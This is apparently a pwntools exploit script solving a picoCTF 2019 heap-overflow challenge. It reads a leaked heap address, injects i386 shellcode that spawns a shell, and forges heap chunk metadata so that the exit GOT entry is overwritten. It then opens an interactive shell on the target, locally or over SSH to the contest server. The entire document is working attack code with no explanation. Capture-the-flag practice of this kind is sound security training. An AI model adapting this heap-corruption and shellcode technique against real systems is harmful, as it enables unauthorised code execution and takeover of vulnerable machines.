from pwn import *
import sys

argv = sys.argv

DEBUG = True
BINARY = './vuln'

context.binary = BINARY
context.terminal = ['tmux', 'splitw', '-v']

def attach_gdb():
  gdb.attach(sh)

if DEBUG:
  context.log_level = 'debug'

if len(argv) < 2:
  stdout = process.PTY
  stdin = process.PTY

  sh = process(BINARY, stdout=stdout, stdin=stdin)

  if DEBUG:
    attach_gdb()

  REMOTE = False
else:
  s = ssh(host='2019shell1.picoctf.com', user='sashackers', password="XXX")
  sh = s.process('vun', cwd='/problems/heap-overflow_5_39d709fdc06b81d3c23b73bb9cca6bdb')
  REMOTE = True

print sh.recvline()
leak = int(sh.recvline())

print hex(leak)

exit_got = 0x0804d02c

shellcode = 'a'*8
shellcode += asm('''
  jmp sc
  {}
sc:
  nop
  '''.format('nop\n'*100)+shellcraft.i386.linux.sh())
# print enhex(shellcode)
# shellcode = shellcode.ljust(0x2a0-0x4)
# shellcode += p32(0x49)
shellcode = shellcode.ljust(0x2a0-0x4)
shellcode += p32(0x49).ljust(0x48)
shellcode += p32(0x101)

sh.sendlineafter('fullname\n', shellcode)


fake_chunk = p32(0x101)
fake_chunk += p32(exit_got-12) 
fake_chunk += p32(leak+8)
fake_chunk = fake_chunk.ljust(0x100-0x4)+p32(0x101)

payload = 'a'*(0x100-4)+fake_chunk

sh.sendlineafter('lastname\n', payload)

sh.interactive()
